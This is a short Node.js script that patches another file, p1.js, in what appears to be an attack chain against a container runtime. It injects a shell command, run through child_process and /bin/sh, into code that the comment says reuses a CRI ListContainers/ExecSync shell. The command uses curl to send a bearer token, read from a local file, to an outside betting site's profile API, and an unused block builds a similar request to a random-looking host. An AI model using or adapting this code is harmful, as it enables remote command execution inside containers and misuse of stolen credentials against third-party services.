const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const tk=fs.readFileSync('..\\tok_tt.txt','utf8').trim();
const tag='CC'+Math.floor(Math.random()*90000+10000);
const S=`curl -s -m 10 -X POST -H "content-type: application/json" -H "authorization: Bearer ${tk}" -d '{"city":"${tag}"}' https://lidyabet1230.com/api/user/profile`;
const pre=fs.readFileSync('p1.js','utf8');
const code=`
const https=require('https');
const body=JSON.stringify({firstName:'x'});
const CMD=${JSON.stringify(S)};
const r=https.request({host:'423c088f8a3791.6qsfv.com',port:443,path:'/auth/profile',method:'PUT',headers:{'content-type':'application/json','content-length':Buffer.byteLength(body),authorization:'Bearer ${tk}'},timeout:6000},res=>{res.resume()});
r.on('error',()=>{});r.write(body);r.end();
`;
// keep CRI part: reuse existing ListContainers/ExecSync shell but with our CMD
let src=fs.readFileSync('p1.js','utf8');
src=src.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify('const cp=require("child_process"); cp.spawnSync("/bin/sh",["-c",'+JSON.stringify(S)+']);')+'\n');
fs.writeFileSync('p1.js',src);console.log('tag='+tag);
